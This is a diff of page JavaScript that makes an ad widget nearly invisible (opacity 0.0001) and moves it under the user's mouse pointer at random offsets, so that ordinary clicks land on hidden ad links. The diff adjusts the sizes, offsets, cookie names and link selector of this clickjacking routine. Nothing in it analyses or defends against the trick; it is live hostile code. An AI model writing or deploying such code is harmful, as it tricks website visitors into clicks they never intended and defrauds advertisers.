@@ -89,7 +89,7 @@ function showDiv() {
     $("#_z0s59a_div" + uniqueID).css("width", "940px").css("height", "200px").css("z-index", "90000").css("position", "absolute");
 }
 function setClick(){
-    setCookie("_z2_delay_time",  "1", 4);
+    setCookie("_zx2_delay_time",  "1", 4);
     document.activeElement.blur();
 }
 function startTracker() {
@@ -104,7 +104,7 @@ function startTracker() {
 }
 function h12_revertDiv() {
     h12_canTrack = 0;
-    $("#" + h12_div).css("z-index", "-90000").css("top", "0").css("left", "0").css("z-index", "").css("position", "fixed").css("width", "").css("pointer-events", "none").css("opacity", "0.0001");
+    $("#" + h12_div).css("z-index", "-90000").css("bottom", "0").css("left", "0").css("z-index", "").css("position", "fixed").css("width", "").css("pointer-events", "none").css("opacity", "0.0001");
 }
 function h12_startScript(){
     h12_div = $('div[id^="M286985ScriptRootC766280"]')[0].id;
@@ -114,15 +114,15 @@ function h12_startScript(){
         let tracker = pointerTracker(e);
         if (h12_canTrack == 1) {
             $("#" + h12_div).css({
-                left:  tracker.x - Math.floor(Math.random()*(10-790+1)+790),
-                top:   tracker.y - Math.floor(Math.random()*(10-190+1)+190),
+                left:  tracker.x - Math.floor(Math.random()*(10-560+1)+560),
+                top:   tracker.y - Math.floor(Math.random()*(10-70+1)+70),
             });
         }
     });
 
     $("#" + h12_div).css("z-index", "-90000").css("position", "fixed").css("bottom", "0").css("opacity", "0.0001").css("pointer-events", "none");
     $("#" + h12_div + ' .mgline').css("margin", "0");
-    if(getCookie("_z2_delay_time") == null && getCookie("_z1_delay_time") != null){
+    if(getCookie("_zx2_delay_time") == null && getCookie("_zx1_delay_time") != null){
         $('#'+ h12_div +' .mgheader').remove();
         $('#'+ h12_div +' a').click(function(){h12_clickfuncion2(); return false;});
 
@@ -131,10 +131,10 @@ function h12_startScript(){
 }
 function h12_followDiv() {
     h12_canTrack = 1;
-    $("#" + h12_div).css("z-index", "90000").css("position", "absolute").css("opacity", "0.0001").css("width", "800px").css("pointer-events", "");
+    $("#" + h12_div).css("z-index", "90000").css("position", "absolute").css("opacity", "0.0001").css("width", "600px").css("pointer-events", "");
 }
 function h12_clickfuncion2() {
-    let randLinks = $('#'+ h12_div +' a[href^="https://www.adskeeper.co.uk/"]');
+    let randLinks = $('#'+ h12_div +' a[href^="https://www."]');
     randomizeArray(randLinks);
     h12_link = randLinks[0].href;
 
